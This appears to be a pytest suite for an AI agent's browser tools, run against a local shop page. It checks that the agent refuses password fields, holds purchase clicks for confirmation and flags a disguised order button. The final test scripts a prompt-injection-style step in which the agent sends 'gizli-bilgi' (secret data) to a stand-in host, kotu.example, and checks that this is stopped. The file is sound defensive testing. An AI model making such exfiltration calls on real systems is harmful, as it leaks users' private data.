"""Browser tools against a local test site in headless Chromium."""
import http.server
import os
import threading
from pathlib import Path

import pytest

from jarvis_core.araclar import KAYIT, Baglam
from jarvis_core.izinler import DIS_ILETISIM, YAZMA

CHROMIUM = '/opt/pw-browsers/chromium-1194/chrome-linux/chrome'
pytestmark = pytest.mark.skipif(not Path(CHROMIUM).exists() and not os.getenv('JARVIS_TARAYICI_YOLU'),
                                reason='Chromium yok')

SAYFALAR = {
    '/': '''<html><head><title>Havuz Market</title></head><body>
      <h1>Havuz Market</h1><a href="/urunler">Ürünler</a>
      <form action="/ara"><input name="q" placeholder="Ara" type="search"></form>
      <form action="/giris" method="post"><label>Kullanıcı <input name="kullanici"></label>
        <label>Parola <input name="parola" type="password"></label><button type="submit">Giriş</button></form>
      <button onclick="document.title='SATILDI'">Satın Al</button>
      <button aria-label="Siparişi tamamla" onclick="document.title='SIPARIS'">Teklif İste</button>
      <a href="/katalog.pdf">Katalog PDF</a></body></html>''',
    '/urunler': '<html><head><title>Ürünler</title></head><body><p>Klor tableti 5 kg</p></body></html>',
}


class _Site(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        yol = self.path.split('?')[0]
        if yol == '/katalog.pdf':
            govde = b'%PDF-1.4 katalog' * 100
            self.send_response(200)
            self.send_header('Content-Type', 'application/pdf')
            self.send_header('Content-Disposition', 'attachment; filename="katalog.pdf"')
        elif yol == '/ara':
            govde = f'<html><head><title>Sonuçlar</title></head><body>{self.path}</body></html>'.encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
        else:
            govde = SAYFALAR.get(yol, 'yok').encode()
            self.send_response(200 if yol in SAYFALAR else 404)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(govde)))
        self.end_headers()
        self.wfile.write(govde)

    def log_message(self, *a):
        pass


@pytest.fixture
def site(ev, monkeypatch):
    if not os.getenv('JARVIS_TARAYICI_YOLU'):
        monkeypatch.setenv('JARVIS_TARAYICI_YOLU', CHROMIUM)
    monkeypatch.setenv('JARVIS_TARAYICI_GIZLI', '1')
    s = http.server.ThreadingHTTPServer(('127.0.0.1', 0), _Site)
    threading.Thread(target=s.serve_forever, daemon=True).start()
    yield f'http://127.0.0.1:{s.server_port}'
    from jarvis_core.araclar import tarayici
    tarayici.kapat()
    s.shutdown()


def _c(ad, **a):
    return KAYIT[ad].calistir(Baglam(threading.Event()), **a)


def test_git_oku_tikla_ara_sekme_indir(site, ev):
    assert 'Havuz Market' in _c('tarayici_git', adres=site + '/').cikti
    oku = _c('sayfa_oku').cikti
    assert 'Ürünler' in oku and 'input:password' in oku

    s = _c('tarayici_tikla', metin='Ürünler')
    assert s.basarili and s.dogrulandi and '/urunler' in s.cikti

    _c('tarayici_git', adres=site + '/')
    s = _c('tarayici_yaz', alan='Ara', metin='klor', gonder=True)
    assert s.basarili and s.dogrulandi and 'q=klor' in s.cikti

    _c('tarayici_git', adres=site + '/urunler', yeni_sekme=True)
    assert len(_c('sekmeler').cikti.splitlines()) == 2
    assert _c('sekme_kapat').dogrulandi

    _c('tarayici_git', adres=site + '/')
    s = _c('tarayici_indir', metin='Katalog PDF')
    assert s.dogrulandi and (ev / 'Downloads' / 'katalog.pdf').stat().st_size > 0


def test_parola_alanina_yazmaz(site):
    _c('tarayici_git', adres=site + '/')
    s = _c('tarayici_yaz', alan='Parola', metin='gizli123')
    assert not s.basarili and 'parola' in s.cikti.lower()


def test_hassas_dugmeler(site, motor_yap):
    _c('tarayici_git', adres=site + '/')
    tik = KAYIT['tarayici_tikla']
    assert tik.risk_belirle({'metin': 'Satın Al'}) == DIS_ILETISIM
    assert tik.risk_belirle({'metin': 'Ürünler'}) == YAZMA
    # rule allowing everything still cannot pre-approve a purchase click
    iz = motor_yap([]).izinler
    iz.kural_ekle('*', '', 'izin')
    assert iz.karar(tik, {'metin': 'Satın Al'})[0] == 'sor'
    # a harmless label hiding a sensitive button is caught at click time
    s = _c('tarayici_tikla', metin='Teklif İste')
    assert not s.basarili and 'hassas' in s.cikti
    assert _c('sayfa_oku').cikti.startswith('"Havuz Market"')     # not clicked


def test_sayfadaki_talimat_veri_kaciramaz(site, motor_yap, ev):
    m = motor_yap([[('tarayici_git', {'adres': site + '/urunler'})], [('sayfa_oku', {})],
                   [('tarayici_git', {'adres': 'https://kotu.example/topla?veri=gizli-bilgi'})], 'Tamam.'])
    m.calistir('ürünler sayfasını oku')
    assert m.sorular and 'harici içerik' in m.sorular[0]
